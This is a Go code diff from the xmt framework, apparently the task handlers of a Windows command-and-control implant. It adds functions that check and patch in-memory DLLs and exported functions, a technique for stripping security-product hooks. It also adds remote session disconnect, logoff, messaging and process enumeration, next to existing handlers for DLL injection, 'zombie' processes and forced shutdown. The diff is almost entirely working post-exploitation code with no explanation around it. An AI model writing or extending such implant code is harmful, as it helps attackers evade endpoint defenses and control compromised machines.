@@ -30,7 +30,6 @@ import (
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
-	"github.com/iDigitalFlame/xmt/device/evade"
 	"github.com/iDigitalFlame/xmt/device/regedit"
 	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/device/winapi/registry"
@@ -116,22 +115,75 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 	return xerr.Sub("invalid operation", 0x68)
 }
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
-	s, err := r.StringVal()
+	var (
+		a    uint32
+		b    []byte
+		v    bool
+		err  error
+		n, f string
+	)
+	if err = r.ReadString(&n); err != nil {
+		return err
+	}
+	if err = r.ReadString(&f); err != nil {
+		return err
+	}
+	if err = r.ReadUint32(&a); err != nil {
+		return nil
+	}
+	if err = r.ReadBytes(&b); err != nil {
+		return err
+	}
+	switch {
+	case len(f) > 0:
+		if a == 1 && len(b) == 0 {
+			if b, err = winapi.ExtractDLLFunction(n, f, 16); err != nil {
+				return err
+			}
+		}
+		v, err = winapi.CheckFunction(n, f, b)
+	case len(b) > 0:
+		v, err = winapi.CheckDLL(n, a, b)
+	default:
+		v, err = winapi.CheckDLLFile(n)
+	}
 	if err != nil {
 		return err
 	}
-	o, err := evade.CheckDLL(s)
-	if err != nil {
-		return err
-	}
-	return w.WriteBool(o)
+	w.WriteBool(v)
+	return nil
 }
-func taskReload(_ context.Context, r data.Reader, _ data.Writer) error {
-	s, err := r.StringVal()
-	if err != nil {
+func taskPatch(_ context.Context, r data.Reader, w data.Writer) error {
+	var (
+		a    uint32
+		b    []byte
+		n, f string
+	)
+	if err := r.ReadString(&n); err != nil {
 		return err
 	}
-	return evade.ReloadDLL(s)
+	if err := r.ReadString(&f); err != nil {
+		return err
+	}
+	if err := r.ReadUint32(&a); err != nil {
+		return nil
+	}
+	if err := r.ReadBytes(&b); err != nil {
+		return err
+	}
+	if len(f) == 0 {
+		if len(b) == 0 {
+			return winapi.PatchDLLFile(n)
+		}
+		return winapi.PatchDLL(n, a, b)
+	}
+	if len(b) == 0 {
+		var err error
+		if b, err = winapi.ExtractDLLFunction(n, f, 16); err != nil {
+			return err
+		}
+	}
+	return winapi.PatchFunction(n, f, b)
 }
 func taskInject(x context.Context, r data.Reader, w data.Writer) error {
 	d, z, v, err := DLLUnmarshal(x, r)
@@ -201,9 +253,6 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 	s.WriteUint32Pos(0, i)
 	s.WriteUint32Pos(4, uint32(c))
 	return nil
-}
-func taskRename(_ context.Context, _ data.Reader, _ data.Writer) error {
-	return device.ErrNoNix
 }
 func taskUntrust(_ context.Context, r data.Reader, _ data.Writer) error {
 	var f filter.Filter
@@ -328,7 +377,7 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 	}
 	return registry.ErrUnexpectedType
 }
-func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
+func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 	t, err := r.Uint8()
 	if err != nil {
 		return err
@@ -370,8 +419,12 @@ func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
 		if err = r.ReadString(&d); err != nil {
 			return err
 		}
-		_, err = winapi.MessageBox(uintptr(h), d, t, f)
-		return err
+		o, err := winapi.MessageBox(uintptr(h), d, t, f)
+		if err != nil {
+			return err
+		}
+		w.WriteUint32(o)
+		return nil
 	case taskWindowMove:
 		var x, y, w, v int32
 		if err = r.ReadInt32(&x); err != nil {
@@ -417,6 +470,72 @@ func taskShutdown(_ context.Context, r data.Reader, _ data.Writer) error {
 	}
 	winapi.EnablePrivileges("SeShutdownPrivilege")
 	return winapi.InitiateSystemShutdownEx("", m, t, v&2 != 0, v&1 != 0, c)
+}
+func taskLoginsAct(_ context.Context, r data.Reader, w data.Writer) error {
+	a, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	s, err := r.Int32()
+	if err != nil {
+		return err
+	}
+	switch a {
+	case taskLoginsDisconnect:
+		return winapi.WTSDisconnectSession(0, s, false)
+	case taskLoginsLogoff:
+		return winapi.WTSLogoffSession(0, s, false)
+	case taskLoginsMessage:
+		var (
+			t, d string
+			f, x uint32
+			v    bool
+		)
+		if err = r.ReadUint32(&f); err != nil {
+			return err
+		}
+		if err = r.ReadUint32(&x); err != nil {
+			return err
+		}
+		if err = r.ReadBool(&v); err != nil {
+			return err
+		}
+		if err = r.ReadString(&t); err != nil {
+			return err
+		}
+		if err = r.ReadString(&d); err != nil {
+			return err
+		}
+		o, err := winapi.WTSSendMessage(0, s, t, d, f, x, v)
+		if err != nil {
+			return err
+		}
+		w.WriteUint32(o)
+		return nil
+	}
+	return xerr.Sub("invalid operation", 0x68)
+}
+func taskLoginsProc(_ context.Context, r data.Reader, w data.Writer) error {
+	s, err := r.Int32()
+	if err != nil {
+		return err
+	}
+	e, err := winapi.WTSEnumerateProcesses(0, s)
+	if err != nil {
+		return err
+	}
+	if err = w.WriteUint32(uint32(len(e))); err != nil {
+		return err
+	}
+	if len(e) == 0 {
+		return nil
+	}
+	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
+		if err = e[i].MarshalStream(w); err != nil {
+			return err
+		}
+	}
+	return nil
 }
 func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
 	e, err := winapi.TopLevelWindows()
